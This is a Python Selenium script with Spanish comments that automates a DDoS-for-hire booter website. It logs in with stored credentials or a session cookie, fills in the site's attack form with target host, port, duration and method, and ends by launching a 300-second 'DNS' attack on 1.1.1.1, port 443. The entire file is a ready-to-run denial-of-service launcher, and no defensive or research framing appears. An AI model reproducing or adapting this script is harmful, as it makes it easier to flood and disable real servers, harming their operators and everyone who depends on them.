from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.options import Options
from selenium.webdriver import ChromeService, FirefoxService

import os
import logging



# Poner env vars si quiere login por formulario
username = os.getenv("username")
password = os.getenv("password")




drivers = {
    "geckoDriver": "./drivers/geckodriver.exe",
    "chromeDriver": "./drivers/chromedriver.exe"
}

logger = logging.getLogger('selenium')
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler("./debug.log")
logger.addHandler(handler)


firefox_options = webdriver.FirefoxOptions()


#firefox_options.add_argument("--headless")


service = FirefoxService(executable_path=drivers["geckoDriver"], log_output="./debug.log")


# Poner cookies si quiere login por cookies
cookies = [
    {
        "name": "UID",
        #"exp": os.getenv("coookie_exp"),
        "value": os.getenv("cookie")
    }
]

driver = webdriver.Firefox(service=service, options=firefox_options)
#driver.add_cookie(cookie_dict=cookies[0])

class Pages:
    def __init__(self) -> None:
        pass

    def index_page(self) -> None:
        driver.get("https://www.stressthem.se")

    def login_page(self) -> None:
        driver.get("https://www.stressthem.se/login")

    def DDoS_page(self) -> None:
        driver.get("https://www.stressthem.se/hub")

class Main(Pages):
    def __init__(self, driver: webdriver.Chrome) -> None:
        driver.get("https://www.stressthem.se")
        driver.implicitly_wait(0.5)



    def login_form(self) -> any:
        self.login_page()

        print(driver.page_source)
        username_form = driver.find_element(By.ID, "username")
        username_form.send_keys(username)
        password_form = driver.find_element(By.ID, "password")
        password_form.send_keys(password)
        driver.implicitly_wait(0.5)
        driver.find_element(By.CLASS_NAME, "btn").click()

    def login_cookies(self) -> any:
        for cookie in cookies:
            driver.add_cookie(cookie)

    def start_attack(self, ip: str, port: int, time: int, method: str):
        self.DDoS_page()

        self.button_telegram = driver.find_element(By.CLASS_NAME, "close")
        
        self.ip_form = driver.find_element(By.ID, "host")
        self.port_form = driver.find_element(By.ID, "port")
        self.time_form = driver.find_element(By.ID, "time")
        self.method_form = Select(driver.find_element(By.ID, "method"))
        self.button_form = driver.find_element(By.CLASS_NAME, "btn")


        self.button_telegram.click()
        self.DDoS_page()
        self.ip_form.send_keys(ip)
        self.port_form.send_keys(port)
        self.time_form.send_keys(time)
        self.method_form.select_by_value(method)
        self.button_form.click()


    def driver_quit(self) -> any:
        driver.quit()



bot = Main(driver=driver)
bot.login_form()

bot.start_attack("1.1.1.1", 443, 300, "DNS")
